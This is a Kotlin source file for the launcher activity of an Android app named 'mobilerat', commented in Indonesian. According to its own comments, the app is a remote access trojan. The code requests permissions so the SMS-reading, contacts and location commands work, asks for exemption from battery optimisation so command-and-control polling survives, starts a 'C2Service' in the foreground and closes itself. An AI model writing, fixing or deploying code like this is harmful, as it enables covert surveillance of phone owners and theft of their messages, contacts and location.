package com.kai.mobilerat

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.core.content.ContextCompat

/**
 * Layar peluncur. Tugasnya tiga, lalu mati:
 *
 *  1. minta permission runtime — tanpa ini smsread/contacts/loc mati
 *  2. minta pengecualian optimasi baterai — tanpa ini Doze membunuh polling
 *  3. nyalakan service sebagai foreground
 *
 * Versi lama memanggil startService() lalu finish() tanpa pernah meminta
 * permission, jadi semua perintah sensitif gagal dengan SecurityException.
 */
class MainActivity : Activity() {

    private var asked = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        asked = savedInstanceState?.getBoolean("asked") ?: false
        if (!asked) {
            asked = true
            requestPermissions(Perms.wanted(), REQ)
        } else {
            kick()
        }
    }

    override fun onSaveInstanceState(outState: Bundle) {
        super.onSaveInstanceState(outState)
        outState.putBoolean("asked", asked)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        kick()
    }

    private fun kick() {
        // Foreground service, bukan startService: di API 26+ startService dari
        // luar layar akan melempar IllegalStateException.
        try {
            ContextCompat.startForegroundService(this, Intent(this, C2Service::class.java))
        } catch (_: Exception) {
        }
        askBattery()
        finish()
    }

    private fun askBattery() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (pm.isIgnoringBatteryOptimizations(packageName)) return
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } catch (_: Exception) {
            try {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            } catch (_: Exception) {
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
    }

    companion object {
        private const val REQ = 41
    }
}
